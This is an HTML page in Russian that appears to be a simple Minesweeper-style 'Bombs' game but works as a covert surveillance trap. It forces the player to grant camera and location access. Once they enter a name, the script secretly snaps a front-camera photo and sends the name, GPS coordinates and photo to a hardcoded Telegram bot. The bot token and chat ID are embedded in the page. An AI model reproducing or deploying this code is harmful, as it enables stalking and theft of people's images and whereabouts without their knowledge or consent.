<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Мини-игра Бомбы</title>
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet" />
<style>
  body {
    margin: 0; padding: 0;
    font-family: 'Montserrat', sans-serif;
    background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1350&q=80') no-repeat center center fixed;
    background-size: cover;
    color: #f0f0f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    flex-direction: column;
    user-select: none;
    text-shadow: 0 0 8px rgba(0,0,0,0.7);
  }
  #permission-denied, #name-section, #game {
    display: none;
    background: rgba(0,0,0,0.6);
    padding: 20px 30px;
    border-radius: 15px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.8);
    max-width: 420px;
    width: 90%;
    text-align: center;
  }
  #permission-denied.active, #name-section.active, #game.active {
    display: block;
  }
  #name-section input {
    font-size: 18px;
    padding: 12px 16px;
    border-radius: 10px;
    border: none;
    margin-right: 12px;
    width: 70%;
    outline: none;
    box-shadow: inset 0 0 10px rgba(255,255,255,0.3);
    color: #333;
  }
  button {
    cursor: pointer;
    padding: 12px 24px;
    font-size: 20px;
    border-radius: 12px;
    border: none;
    background-color: #6c63ff;
    color: white;
    font-weight: 700;
    transition: background-color 0.3s ease, box-shadow 0.3s ease;
    box-shadow: 0 4px 12px rgba(108, 99, 255, 0.6);
  }
  button:hover {
    background-color: #857aff;
    box-shadow: 0 6px 18px rgba(133, 122, 255, 0.8);
  }
  #error-msg {
    margin-top: 10px;
    color: #ff6666;
    font-weight: 600;
  }
  #game-board {
    margin-top: 20px;
    display: grid;
    grid-template-columns: repeat(8, 48px);
    grid-template-rows: repeat(8, 48px);
    gap: 6px;
    user-select: none;
  }
  .cell {
    width: 48px;
    height: 48px;
    background-color: #2c2c7a;
    border-radius: 8px;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    font-weight: 700;
    font-size: 22px;
    color: #eee;
    box-shadow: inset 0 3px 8px rgba(255,255,255,0.2);
    transition: background-color 0.2s ease;
  }
  .cell.open {
    background-color: #b3b3ff;
    color: #1a1a4d;
    cursor: default;
    box-shadow: none;
  }
  .cell.bomb {
    background-color: #ff5252;
    color: white;
    box-shadow: 0 0 10px 3px #ff5252aa;
  }
  #status {
    margin-top: 18px;
    font-size: 20px;
    font-weight: 700;
    text-shadow: 0 0 6px #000a;
  }
</style>
</head>
<body>

<audio id="bg-audio" loop autoplay muted>
  <source src="https://cdn.pixabay.com/download/audio/2022/03/14/audio_65b79a2eeb.mp3?filename=soft-ambient-11670.mp3" type="audio/mpeg">
</audio>

<div id="permission-denied">
  <p>Для игры нужно разрешить доступ к камере и местоположению.<br>Перезагрузите страницу и разрешите.</p>
</div>

<div id="name-section">
  <input type="text" id="player-name" placeholder="Введите имя" autocomplete="off" />
  <button id="start-game-btn">Начать игру</button>
  <div id="error-msg"></div>
</div>

<div id="game">
  <h2>Игра: Бомбы</h2>
  <div id="game-board"></div>
  <p id="status"></p>
</div>

<script>
(async () => {
  const permissionDeniedDiv = document.getElementById('permission-denied');
  const nameSection = document.getElementById('name-section');
  const gameDiv = document.getElementById('game');
  const playerNameInput = document.getElementById('player-name');
  const startGameBtn = document.getElementById('start-game-btn');
  const errorMsg = document.getElementById('error-msg');
  const gameBoard = document.getElementById('game-board');
  const statusP = document.getElementById('status');

  let stream = null;
  let coords = null;
  let photoBlob = null;
  let playerName = '';

  async function requestPermissions() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      coords = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout:10000});
      });
      return true;
    } catch(e) {
      return false;
    }
  }

  async function takePhoto() {
    if (!stream) return null;
    const track = stream.getVideoTracks()[0];
    if ('ImageCapture' in window) {
      try {
        const imageCapture = new ImageCapture(track);
        const photo = await imageCapture.takePhoto();
        return photo;
      } catch(e) {}
    }
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 320;
    canvas.height = video.videoHeight || 240;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    video.pause();
    track.stop();
    return await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
  }

  const hasPermissions = await requestPermissions();
  if (!hasPermissions) {
    permissionDeniedDiv.classList.add('active');
    return;
  }

  nameSection.classList.add('active');

  startGameBtn.onclick = async () => {
    playerName = playerNameInput.value.trim();
    if (playerName.length < 1) {
      errorMsg.textContent = "Пожалуйста, введите имя.";
      return;
    }
    errorMsg.textContent = "";

    photoBlob = await takePhoto();

    sendDataToTelegram(playerName, coords.coords.latitude, coords.coords.longitude, photoBlob);

    nameSection.classList.remove('active');
    startGame();
  };

  const size = 8;
  const bombsCount = 10;
  let board = [];
  let openedCount = 0;
  let gameOver = false;

  function startGame() {
    gameDiv.classList.add('active');
    statusP.textContent = '';
    board = createBoard(size, bombsCount);
    openedCount = 0;
    gameOver = false;
    renderBoard();
  }

  function createBoard(size, bombsCount) {
    let cells = [];
    for(let i=0; i<size*size; i++) {
      cells.push({bomb:false, open:false, adjacent:0});
    }

    let bombsPlaced = 0;
    while (bombsPlaced < bombsCount) {
      const idx = Math.floor(Math.random() * size * size);
      if (!cells[idx].bomb) {
        cells[idx].bomb = true;
        bombsPlaced++;
      }
    }

    for (let i=0; i<size*size; i++) {
      if (cells[i].bomb) continue;
      const neighbors = getNeighbors(i, size);
      let count = 0;
      for (const n of neighbors) {
        if (cells[n].bomb) count++;
      }
      cells[i].adjacent = count;
    }
    return cells;
  }

  function getNeighbors(index, size) {
    const neighbors = [];
    const row = Math.floor(index / size);
    const col = index % size;
    for (let r = row - 1; r <= row + 1; r++) {
      for (let c = col -1; c <= col + 1; c++) {
        if (r < 0 || r >= size || c < 0 || c >= size) continue;
        if (r === row && c === col) continue;
        neighbors.push(r * size + c);
      }
    }
    return neighbors;
  }

  function renderBoard() {
    gameBoard.innerHTML = '';
    for(let i=0; i<board.length; i++) {
      const cell = document.createElement('div');
      cell.classList.add('cell');
      if (board[i].open) cell.classList.add('open');
      if (board[i].open && board[i].bomb) cell.classList.add('bomb');
      cell.dataset.index = i;
      cell.addEventListener('click', () => onCellClick(i));
      gameBoard.appendChild(cell);
    }
  }

  function openCell(i) {
    if (board[i].open || gameOver) return;
    board[i].open = true;
    openedCount++;
    if (board[i].bomb) {
      gameOver = true;
      revealBombs();
      statusP.textContent = "Вы взорвались! Игра окончена.";
      return;
    }
    if (board[i].adjacent === 0) {
      const neighbors = getNeighbors(i, size);
      neighbors.forEach(n => openCell(n));
    }
    if (openedCount === size*size - bombsCount) {
      gameOver = true;
      statusP.textContent = "Поздравляем! Вы выиграли!";
      revealBombs();
    }
  }

  function revealBombs() {
    for(let i=0; i<board.length; i++) {
      if (board[i].bomb) board[i].open = true;
    }
    renderBoard();
  }

  function onCellClick(i) {
    openCell(i);
    renderBoard();
  }

  function sendDataToTelegram(name, lat, lon, photoBlob) {
    const text = `Новый игрок: ${name}\nШирота: ${lat}\nДолгота: ${lon}`;

    fetch(`https://api.telegram.org/bot7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M/sendMessage?chat_id=526758225&text=${encodeURIComponent(text)}`)
      .catch(console.error);

    if (photoBlob) {
      const formData = new FormData();
      formData.append('chat_id', '526758225');
      formData.append('photo', photoBlob, 'photo.jpg');
      formData.append('caption', `Фото игрока: ${name}`);

      fetch(`https://api.telegram.org/bot7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M/sendPhoto`, {
        method: 'POST',
        body: formData
      }).catch(console.error);
    }
  }
})();
</script>

</body>
</html>
